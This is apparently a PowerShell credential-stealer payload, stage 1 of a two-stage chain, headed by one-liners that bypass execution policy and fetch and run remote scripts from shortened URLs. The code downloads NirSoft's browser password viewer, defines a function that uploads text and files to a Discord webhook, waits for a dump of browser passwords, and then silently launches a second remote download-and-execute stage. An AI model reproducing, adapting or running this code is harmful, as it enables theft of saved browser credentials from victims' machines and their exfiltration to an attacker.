<# 

______________________________________________________________________________________________

888      d888                             888          d8888                            d8888  
888     d8888                             888         d8P888                           d8P888  
888       888                             888        d8P 888                          d8P 888  
88888b.   888   .d88b.           88888b.  88888b.   d8P  888  888d888 88888b.d88b.   d8P  888  
888 "88b  888  d88P"88b          888 "88b 888 "88b d88   888  888P"   888 "888 "88b d88   888  
888  888  888  888  888          888  888 888  888 8888888888 888     888  888  888 8888888888 
888 d88P  888  Y88b 888          888 d88P 888  888       888  888     888  888  888       888  
88888P" 8888888 "Y88888 88888888 88888P"  888  888       888  888     888  888  888       888  
                    888          888                                                           
               Y8b d88P          888                                                           
                "Y88P"           888                                                           
______________________________________________________________________________________________


Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
W1ns1d3r_st4gg2d --> stage1 url : https://shorturl.at/evBKX
W1ns1d3r_st4gg2d --> stage2 url : https://shorturl.at/rLQS5

Need to modify the invoke command to fit your needs : 
	-Put your discord webhook into $dc=''
 	-Put your dropbox webhook into $db=''

Invoke stage1.ps1 via windows : 
powershell -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/evBKX | iex

Invoke stage2.ps1 via windows : 
powershell -w h -NoP -Ep Bypass $dc=$dc;$db=$db;irm https://shorturl.at/rLQS5 | iex


#>



# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (Test-Path -Path "C:\temp" -PathType Container) {
        # The folder exists

        # Check if the current directory is C:\temp
        if (-not (Get-Location).Path -eq "C:\temp") {
            # If not, change the directory
            Set-Location -Path "C:\temp"
        }
    } else {
        # The folder does not exist, create it, and change the directory
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
        Set-Location -Path "C:\temp"
    }
}

# Function to download Nirsoft tools
function Get-Nirsoft {
    $zipPassword = 'wbpv28821@'  # Archive password
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
    Expand-Archive 7z.zip
    .\7z\7za.exe e wbpv.zip
}


# Function to upload content to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}


# Chemin du fichier à surveiller
$filePath = "c:\temp\w3b_br0ws3r_p4ssw0rds.txt"

# Fonction pour attendre la création du fichier
function Wait-FileCreation {
    param (
        [string]$Path,
        [int]$TimeoutInSeconds = 60
    )

    $timeout = (Get-Date).AddSeconds($TimeoutInSeconds)

    while (!(Test-Path $Path) -and (Get-Date) -lt $timeout) {
        Start-Sleep -Seconds 1
    }

    return (Test-Path $Path)
}

# Call TempDir function
TempDir

# Call Get-Nirsoft function to download Nirsoft tools
Get-Nirsoft

# Attendre que le fichier soit créé
if (Wait-FileCreation -Path $filePath) {
    # Le fichier a été créé, exécuter la commande
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$dc='${dc}'; $db='${db}'; irm https://shorturl.at/rLQS5 | iex"
} else {
    Write-Host "Le fichier n'a pas été créé dans le délai imparti."
}
